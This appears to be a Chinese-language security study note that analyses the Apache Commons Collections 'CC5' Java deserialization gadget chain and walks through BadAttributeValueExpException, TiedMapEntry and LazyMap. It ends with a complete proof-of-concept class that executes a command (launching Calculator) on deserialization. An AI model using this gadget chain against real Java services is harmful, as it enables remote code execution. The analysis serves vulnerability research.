0x00 前言

CC指的是 Apache Commons Collections 库，该库是对 Java Collections 的一个扩展，旨在简化集合操作，并提供更强大和灵活的集合操作能力。可以通过maven等依赖管理工具引入该库，如：

<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

当前所记的CC5利用链与 Ysoserial 相同，与 CC1 的LazyMap 用法只差在入口类的区别。

  • Ysoserial 项目注释说该链仅在 JDK 8u76 可用，但是实际在 JDK 8u462 环境测试也可以利用成功。

0x01 涉及的核心组件

组件类名功能/在利用链中承担的作用
InvokerTransformer最基础的执行者，通过反射调用任意方法
ConstantTransformer返回指定的类对象。规避不能通过反射获取类的情况，如Runtime.class
ChainedTransformer链式执行器，将多个执行者连接起来，并依次执行
LazyMap触发点，触发链式执行器
TiedMapEntry触发点，触发下一层触发点
BadAttributeValueExpException入口点，通过该类反序列化时的readObject方法引动触发点，触发利用链

0x02 利用分析

BadAttributeValueExpException

javax.management.BadAttributeValueExpException 类的 readObject() 方法在一定条件下会调用其 val 字段的 toString() 方法。且val 字段没有类型要求。

public class BadAttributeValueExpException extends Exception   {
    // ...
    private Object val;
    // ...
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
 }

经以上源码可见，上述一定条件指：

  • val 字段不为 null
  • val 字段不是 String类型
  • 不存在 security manager或 val 字段是Long、Integer等类型之一。

TiedMapEntry

org.apache.commons.collections.keyvalue.TiedMapEntry 类的 toString() 方法则会调用自身的 getValue() 方法，getValue() 方法又调用自身 map 字段的 get() 方法。map 字段值需要实现 Map 接口，由TiedMapEntry 类的构造方法直接传入。

public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {
    // ...
    private final Map map;
   // ...
   public TiedMapEntry(Map map, Object key) {
      this.map = map;
      this.key = key;
   }
    // ...
   public Object getValue() {
      return this.map.get(this.key);
   }
    // ...
   public String toString() {
      return this.getKey() + "=" + this.getValue();
   }
}

LazyMap …

从 Java反序列化CC1链#LazyMap 我们知道：

  • org.apache.commons.collections.map.LazyMap 类实现了 Map 接口。
  • LazyMap 类的 get() 方法一定条件下会调用 factory 属性的 transform() 方法。
  • factory 字段是一个 Transformer 实例。

从 Transformer#transform() 开始构造一个执行任意命令的利用链也在 Java反序列化CC1链 和 Java反序列化CC3链 中都详细分析过，这里不再重复，以下采用 CC1 的ChainedTransformer链为例。

0x03 构造Payload

结合以上，以 BadAttributeValueExpException 类作为入口到执行任意命令的利用链已经完善：

  • 以 ChainedTransformer、ConstantTransformer、InvokerTransformer 构造执行链。
  • 以上述 Transformer 链为参数构建LazyMap实例。
  • 以上述 LazyMap实例为参数构建 TiedMapEntry实例。
  • 以上述 TiedMapEntry实例为参数构建 BadAttributeValueExpException 实例。

BadAttributeValueExpException 实例反序列化时自动触发 readObject 方法，进而经条件判断调用 TiedMapEntry#toString() 方法，进而触发 TiedMapEntry#getValue() 方法，进而触发LazyMap#get() 方法，进而触发 Transformer#transform() 方法。

public class CC5 {
    public static void main(String[] args) throws Exception{
        Transformer chain = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        });

        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "any_value");
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(exp, "val", entry);
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(exp);
        oos.flush();
        oos.close();
        // 反序列化触发
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
